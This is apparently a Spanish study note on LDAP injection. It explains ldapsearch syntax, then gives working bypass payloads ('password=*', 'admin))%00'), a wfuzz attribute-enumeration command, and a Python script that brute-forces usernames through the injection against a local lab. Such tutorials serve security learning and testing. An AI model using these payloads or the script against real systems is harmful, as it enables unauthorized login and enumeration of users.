-----
- Tags: #ataque #basico #teoria #practica 
----

# ¿ Que es **LDAP** ? 

### **LDAP (Protocolo Ligeor de Acceso a Directoriomuy utilizado en ￼￼Active Directory￼￼ que se usan para gestionar)** pertenece a uno de los tantos [[Servicios y puertos comunes]] y se utiliza para acceder a la información que está almacenadad de forma centralizada en una red. 

---

# ¿ Que son las **Inyecciones LDAP** ?

### Las **Inyecciones LDAP** son un tipo de ataque en el que se aprovechan las vulnerabilidades en las apliacciones web que interactúan con un servidor **LDAP**. El servidor **LDAP** es un directorio que se utiliza para almacenar información de usuarios y recursos en una red. 

### Las **inyecciones LDAP** funcionan mediante la **inserción de comandos LDAP maliciosos** en los **campos de entrada** de una aplicación web, que luego son enviados al servido **LDAP** para su proesamiento. Si la apliacción web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar **operaciones no autorizadas** en el **servidor LDAP**

### Asi como en las [[SQLI - (Inyecciones SQL)]] y [[NoSQLI - (NoSQL Injections)]], las **inyecciones LDAP** pueden ser muy peligrosas. Algunos ejemplos de lo que un atacante podría lograr mediante una inyección LDAP incluyen: 

- ### Acceder a información de usuarios o recursos que no debería tener acceso. 
- ### Realizar cambios no autorizados en la base de datos del servidor **LDAP**, como agregar o eliminar usuarios o recursos. 
- ### Realizar operaciones maliciosas en la red, como lanzar ataques de phishing o instalar software malicioso en los sistemas de la red. 

----

# Explotación 

### Esto puede explotarse cuando una web utiliza busquedas de **LDAP**, por lo que primeramente podriamos entender como seria una busqueda de ldap.

### Obviamente lo primero seria conseguir los datos necesarios como el nombre del domio y demás y esto podria hacerse con [[Nmap]]. 

```shell
locate .nse | grep ldap 
# Para ver todos los scripts programados en lua que tiene nmap acerca de ldap. 
nmap --script ldap\* -p 389 {ip}
```

### Y una vez que entendamos como y de donde conseguir dichos datos, ahora si podemos ver un ejemplo de busqueda de datos con ldap 

```shell
ldapsearch -x -H ldap://{ip} -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```

### Comenzemos a partir por partes el comando. 

- ### `-x` Para una simple autentiación. 
- ### `-H` Para indicar el host. 
- ### `-b dc=example,dc=org` Para hacer referencia a la **base de busqueda**, en donde dado un **dominio**, el cual puede ser por ejemplo, dobliuw.local, dobliuw.org, etc. En este caso es *example.org*, y lo que se hace es fragmentar dicho dominio en dos partes indicando por un lado **example** y por otro **org** de manera `dc=example,dc=org`. 
- ### `-D "cn=admin,dc=example,dc=org"` Esto hace referencia a **Distinguised name**, el cual seria el usuario, en este caso **admin.example.org**, por lo que lo volvemos a fragmentar en partes, por un lado el **cn (Commoun name)** (admin) y por otro, como vimos anteriormente, el dominio fragmentado en **dc**. 
- ### `-w` Esto es para ingresar la contraseña del usuario 
- ### La parte final ( **cn=admin** ) son los parametros de busqueda. 

### Estos parametros de busqueda pueden ser más avanzados, jugando con AND y OR. 

- ### **AND**: `'(&(cn=admin)(description=LDAP*))'`
- ### **OR**: `(|(cn=admin)(description=LDAP*))`

### # Dato: Las estructuras de ldap se configuran en un archivo llamado **slapd.conf**, si grepeamos por la palabra *include* podremos ver las rutas absolutas de los esquemas que se incluyen para asi ver las propiedades de los usuarios por ejemplo. 

----

- ## Basic Bypass

### `username=admin&password=*` Al usar asterisco en LDAP, lo que estamos haciendo es matchear con el valor que haya, por lo que si la web nos permitiece poner un asterisco la busqueda sería 

```shell
ldapsearch -x -H ldap://{ip} -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin)(userPassword=*))'
```

- ## Manipulación de la query original

### Tengamos en cuenta que los campos que se completan son inyectados en los parametros de busqueda de `ldapsearch`, por lo que podriamos intentar modificar la query original de busqueda

```shell 
ldapsearch -x -H ldap://{ip} -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=%s)(userPassword=%s))'
```

### Que pasaria si donde ingresarmos el `username=%s` en la web, que hace referencia al apartado de `(&(cn=%s))`en **ldapsearch**, ingresamos el valor `admin))%00`? Lo que pasaria es que estariamos cerrando manualmente la query original a la par que ingresando un null byte (**%00**) para evitar que se lea la segunda condición de `(userPassword=%s))`. 

```shell
# De alguna manera la query quedaria de la sig manera: 
ldapsearch -x -H ldap://{ip} -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin '(&(cn=admin))%00'#)(userPassword=*))'
```

- ## Enumeración de atributos mediante query maliciosa

### Una vez que sabemos que los campos son vulnerables a estas inyecciones, se nos podria ocurrir realizar scripts en python para enumerar usuarios, jugar con una de las [[⚒ Herramientas ⚒]] com **wfuzz** o **gobuster** para aplicar numeración de los atributos, entre otras cosas.

```shell
wfuzz -c -t 200 --hs=200 -w /usr/share/SecLists/Fuzzing/LDAP-openldap-attributes.txt -d "user_id=admin)(FUZZ=*))%00&password=*&login=1&submit=Submit" "http://localhost:8888"
```

### Por lo que la query maliciosa sería la sig. `admin)(FUZZ=*))%00`. 

### Tambien podriamos crear usuarios (En este caso, debido que tenemos las credenciales del usuario admin de LDAP y estamos en un escenario de ejemplo), con el comando `ldapadd -x -H ldap://{ip} -D "cn=admin,dc=example,dc=org" -w {password} -f {file_ldif}`. 

### Un archivo ldif tiene la definición de (en este caso) la estructura de un usuario, lo cual podria ser algo similar a lo sig.: 

```new_user.ldif
dn: uid=dobliuw,dc=example,dc=org
uid: dobliuw
cn: dobliuw
sn: 3
objectClass: top
objectClass: posixAccount
objectClass: inetOrgPerson
loginShell: /bin/bash
homeDirectory: /home/dobliuw
uidNumber: 14583102
gidNumber: 14564100
userPassword: dobliuw123
mail: dobliuw@example.org
description: El mejor hacker del mundo papaaaaa
telephoneNumber: +54 52345245
```

### Y de esta manera podemos crear un simple script en python para enumerar usuarios: 

```python
#!/usr/bin/python3
from pwn import * 
import sys, requests, time, string, signal 

# Ctrl + C 

def ctrl_c(signal, frame):
    print("\n\n\t[!] Quiting...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global vars

url = "http://localhost:8888"
characters = string.ascii_lowercase
headers = {"Content-Type":"application/x-www-form-urlencoded"}
#burp_proxy = {'http': 'http://127.0.0.1/8080'}

# Bin 

p1 = log.progress("Brute Force")
p2 = log.progress("Users")

def getInitialUsers(): 
    
    users = []

    p1.status("Initializing brute force process")
    time.sleep(5)

    for character in characters: 
        payload = "user_id={}*))%00&password=*&login=1&submit=Submit".format(character)
        p1.status("Sending payload: {}".format(payload))
        r = requests.post(url, headers=headers, data=payload, allow_redirects=False) #proxies=burp_proxy
        if r.status_code == 301: 
            users.append(character)

    return users


def getUser(letter): 

    user = letter 

    for i in range(1,10):
        for character in characters:
            payload = "user_id={}{}*))%00&password=*&login=1&submit=Submit".format(user,character)
            p1.status("Sending payload: {}".format(payload))
            p2.status(user)
            r = requests.post(url, headers=headers, data=payload, allow_redirects=False)
            if r.status_code == 301: 
                user+=character

    return user 


if __name__ == "__main__": 
    initialUsers = getInitialUsers()
    users = []
    for initial in initialUsers:
        users.append(getUser(initial))
        
    print("""\n\n============== Users finded =================  
(!) {}\n\n""".format(users))
```

